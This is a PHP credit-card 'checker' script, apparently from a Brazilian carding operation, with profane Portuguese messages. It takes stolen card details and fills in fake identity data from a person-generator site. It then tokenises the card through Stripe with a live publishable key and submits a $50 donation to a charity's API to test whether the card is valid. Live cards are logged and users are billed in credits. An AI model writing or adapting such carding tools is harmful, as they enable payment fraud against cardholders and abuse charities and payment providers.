<?php



// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


$time = time();


    error_reporting(0);

    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }


$ip = $_SERVER['REMOTE_ADDR'];


/// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("#Error => Vai se foder randola kkkk...!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 ) or ($bloqueador_bin == 6509 )) {

die("#Error => Vai tacar gerada no cu da sua mae ....! ");


}

$ant_noia = substr($lista, 0, 8);
$ant_drogados = substr($lista, 0, 4);


if (($ant_drogados == 'Live')!== false ) {

    die("#Error => Vai se foder randola.....!");

}


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai...!")));


}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida..! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ant-reteste-dies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ant-reteste-lives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

$falha_minusculas = substr($lista, 0, 1);

if (($falha_minusculas == 'a') or ($falha_minusculas == 'b') or ($falha_minusculas == 'c') or ($falha_minusculas == 'd') or ($falha_minusculas == 'e') or ($falha_minusculas == 'f') or ($falha_minusculas == 'g') or ($falha_minusculas == 'h') or ($falha_minusculas == 'i') or ($falha_minusculas == 'j') or ($falha_minusculas == 'k') or ($falha_minusculas == 'l') or ($falha_minusculas == 'm') or ($falha_minusculas == 'n') or ($falha_minusculas == 'o') or ($falha_minusculas == 'p') or ($falha_minusculas == 'q') or ($falha_minusculas == 'r') or ($falha_minusculas == 's') or ($falha_minusculas == 't') or ($falha_minusculas == 'u') or ($falha_minusculas == 'v') or ($falha_minusculas == 'w') or ($falha_minusculas == 'x') or ($falha_minusculas == 'y') or ($falha_minusculas == 'z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}


$falha_maiusculas = substr($lista, 0, 1);

if (($falha_maiusculas == 'A') or ($falha_maiusculas == 'B') or ($falha_maiusculas == 'C') or ($falha_maiusculas == 'D') or ($falha_maiusculas == 'E') or ($falha_maiusculas == 'F') or ($falha_maiusculas == 'G') or ($falha_maiusculas == 'H') or ($falha_maiusculas == 'I') or ($falha_maiusculas == 'J') or ($falha_maiusculas == 'K') or ($falha_maiusculas == 'L') or ($falha_maiusculas == 'M') or ($falha_maiusculas == 'N') or ($falha_maiusculas == 'O') or ($falha_maiusculas == 'P') or ($falha_maiusculas == 'Q') or ($falha_maiusculas == 'R') or ($falha_maiusculas == 'S') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'U') or ($falha_maiusculas == 'V') or ($falha_maiusculas == 'W') or ($falha_maiusculas == 'X') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'Z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}
 

$vencimento_ano = substr($ano, 0, 4);


if (($vencimento_ano == '2021') or ($vencimento_ano == '2020') or ($vencimento_ano == '2019') or ($vencimento_ano == '2018') or ($vencimento_ano == '2017') or ($vencimento_ano == '2016') or ($vencimento_ano == '2015') or ($vencimento_ano == '2014') or ($vencimento_ano == '2013') or ($vencimento_ano == '2012') or ($vencimento_ano == '2011') or ($vencimento_ano == '2010') or ($vencimento_ano == '2009')!== false) {


    die("#Error => CC da época das caverna meu irmão kkkkk...!");


}


$bloquear_ip = substr($cvv, 0, 3);


if (($bloquear_ip == '000' )!== false) {

      $file2 = fopen("IPS.txt", "a");
      fwrite($file2, "$ip\n");

          die("#Error => Tacou 000 né? Seu ip foi bloqueado ...!");
          
}


$ler_ips = file_get_contents("./IPS.txt", "r");

if (strpos($ler_ips, $ip)!== false) {

    die("Seu ip foi bloqueado por testar gerada.! Peça o desbloqueio para o desenvolvedor");


}




 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$verificar_arquivosaldo = file_get_contents("./saldo.txt", "r");

if ($verificar_arquivosaldo < 1 ) {

    die("#Error => Créditos FREE acabaram, chame o desenvolvedor para adicionar mais valores..!");

}



$saldo_total = file_get_contents("./saldo.txt", "r");



// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//

$verificar_bin = substr($lista, 0, 6);


$link = 'https://lookup.binlist.net/'.$verificar_bin.'';

$headers = array (

'accept: */*',
'origin: https://binlist.net',
'referer: https://binlist.net/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers);
$automatizacao_binssearch = curl_exec($ini);



$scheme = strtoupper(json_decode($automatizacao_binssearch, true)['scheme']);
$band = strtoupper(json_decode($automatizacao_binssearch, true)['brand']);
$bank = strtoupper(json_decode($automatizacao_binssearch, true)['bank']['name']);
$type = strtoupper(json_decode($automatizacao_binssearch, true)['type']);
$states = strtoupper(json_decode($automatizacao_binssearch, true)['country']['name']);

$prepaid = metraiapuxar($automatizacao_binssearch, '"prepaid":',',', 1);


if (empty($scheme)!== false) {

    $retorno_scheme = "NÃO ENCONTRADO";

} else {

    $retorno_scheme = ''.$scheme.'';

}

if (empty($band)!== false) {

    $retorno_band = "NÃO ENCONTRADO";

} else {

    $retorno_band = ''.$band.'';
    
}


if (empty($bank)!== false) {

    $retorno_bank = "NÃO ENCONTRADO";

} else {

    $retorno_bank = ''.$bank.'';
    
}


if (empty($type)!== false) {

    $retorno_type = "NÃO ENCONTRADO";

} else {

    $retorno_type = ''.$type.'';
    
}


if (empty($states)!== false) {

    $retorno_states = "NÃO ENCONTRADO";

} else {

    $retorno_states = ''.$states.'';
    
}


if ($prepaid == 'false'){

    $Verificar_prepaid = "NÃO";

} else if ($prepaid == null) {

    $Verificar_prepaid = "N/A";

} else if ($prepaid == 'null'){

    $Verificar_prepaid = "N/A";

} else {

    $Verificar_prepaid = "SIM";

}


// RETORNOS DOS RESULTADOS DA BIN:  $retorno_band $retorno_scheme  $retorno_states $retorno_bank $retorno_type 


// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//

## DADOS INFO - 4DEVS (API DADOS CHK)

$linkurl_dados = "https://www.4devs.com.br/ferramentas_online.php";
$post_dados = 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=';
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.54";


$header_4devs = array (

'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: '.$agent.''

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $linkurl_dados);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_4devs);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_dados);
$dados = curl_exec($ini);


$nome = metraiapuxar($dados, '"nome":"','"');
$cpf = metraiapuxar($dados, '"cpf":"','"');
$rg = metraiapuxar($dados, '"rg":"','"');
$data_nasc = metraiapuxar($dados, '"data_nasc":"','"');
$sexo = metraiapuxar($dados, '"sexo":"','"');
$mae = metraiapuxar($dados, '"mae":"','"');
$pai = metraiapuxar($dados, '"pai":"','"');
$cep = metraiapuxar($dados, '"cep":"','"');
$numero = metraiapuxar($dados, '"numero":',',', 1);
$endereco = metraiapuxar($dados, '"endereco":"','"');
$bairro = metraiapuxar($dados, '"bairro":"','"');
$celular = metraiapuxar($dados, '"celular":"','"');
$cidade = metraiapuxar($dados, '"cidade":"','"');
$email = metraiapuxar($dados, '"email": "','"', 1);
$telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');


## DADOS INFO - 4DEVS (API DADOS CHK)


// ================ // ====================//==========================//============================= // ================================//=================//


$header_stripesrc = array (


'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'

);


$link_stripesrc = "https://api.stripe.com/v1/tokens";


$postfields_stripesrc = 'card[name]='.$nome.'&card[currency]=USD&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=41edac29-5f78-4a69-b18b-3ba85730d719c8f66c&muid=4c637098-f478-4a78-9022-4bf8ced43ec4f55fde&sid=ce565b52-fb17-4394-85d5-34b9b8ad59923a4a98&payment_user_agent=stripe.js%2F1b11d2e60%3B+stripe-js-v3%2F1b11d2e60&time_on_page=126467&key=pk_live_eRSTlTS7diz05r33hQSK1EUH&pasted_fields=number';



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_stripesrc);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_stripesrc);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_stripesrc);
$meupiru = curl_exec($ini);
$id_do_carai = metraiapuxar($meupiru, 'id": "', '"', 1);



$header_pagar = array (

'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://beta.torahanytime.com',
'referer: https://beta.torahanytime.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);

$link_pagar = "https://api.torahanytime.com/donate";

$postfields_pagar = '{"fname":"Marcos","lname":"Santos","phone":"'.$telefone_fixo.'","email":"picamolekkkk2020@gmail.com","taId":"","inHonorOf":"","donateTowards":[],"campaign":"","amount":50,"isRecurring":false,"currency":"USD","currencySymbol":"$","provider":"stripe","preselectedAmount":101,"token":"'.$id_do_carai.'"}';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_pagar);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_pagar);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_pagar);
$pagar = curl_exec($ini);


if (strpos($pagar, 'Invalid account.')!== false) {

    die("#Error => Error de conta....! Tente novamente");


}


$infos = json_decode($pagar, true);
$retorno_code = $infos['code'];
$retorno = $infos['message'];
$puchar_valor = $infos['amount'];
$donation_id = $infos['donationId'];


$puchar_codeall = metraiapuxar($pagar, '{',',', 1);


if (empty($retorno_code)!== false) {

    $code_return = "Houve alguma falha ao obter resultados.!";

} else {

    $code_return = ''.$retorno_code.'';


}


if (empty($retorno)!== false) {

    $return = "Houve alguma falha ao obter os resultados.!";


} else {


    $return = ''.$retorno.'';


}


if (empty($puchar_valor)!== false) {


    $valor_donate = "Houve alguma falha (N/A)";

} else {


    $valor_donate = 'Foi debitado: '.$puchar_valor.' do cartao';


}


if (empty($donation_id)!== false) {


    $order_donate = "Houve alguma falha (N/A)";

} else {


    $order_donate = 'ORDER-ID: '.$donation_id.' Create';


}





if(strpos($pagar, '"code":111')!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> ($code_return) - $return  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> $puchar_codeall <span class='badge badge-primary'>CREDITOS RESTANTE:</span> $saldo_total <br>";

      $arquivo = "saldo.txt";
      $contador = 2000;

      $fp = fopen($arquivo,"r");
      $contador = fgets($fp, 26);
      fclose($fp);

    --$contador;

      $fp = fopen($arquivo,"w+");
      fwrite($fp, $contador, 26);
      fclose($fp);


      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

}  else if (strpos($pagar, '"code":112')!== false ) {

    
    echo "<span class='badge badge-danger'>#Error</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> CC checkando novamente... ! » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-primary'>CREDITOS RESTANTE:</span> $saldo_total <br>";

echo "Reecheck result: <br>";

echo $repetir = str_repeat($pagar, 1);


      $arquivo = "saldo.txt";
      $contador = 2000;

      $fp = fopen($arquivo,"r");
      $contador = fgets($fp, 26);
      fclose($fp);

    --$contador;

      $fp = fopen($arquivo,"w+");
      fwrite($fp, $contador, 26);
      fclose($fp);


} else if (empty($pagar)!== false ) {

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> $retorno  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> Error de Proxy..! <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

}

else {

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-warning'>RETORNO</span> Thank you Donate! <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>ORDER ID (DONATE):</span> $order_donate  <span class='badge badge-warning'>VALOR DEBITADO:</span> $valor_donate <span class='badge badge-primary'>CREDITOS RESTANTE:</span> $saldo_total <br>";

      $arquivo = "saldo.txt";
      $contador = 2000;

      $fp = fopen($arquivo,"r");
      $contador = fgets($fp, 26);
      fclose($fp);

    --$contador;

      $fp = fopen($arquivo,"w+");
      fwrite($fp, $contador, 26);
      fclose($fp);

      $file = fopen("ant-reteste-lives.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


}

?>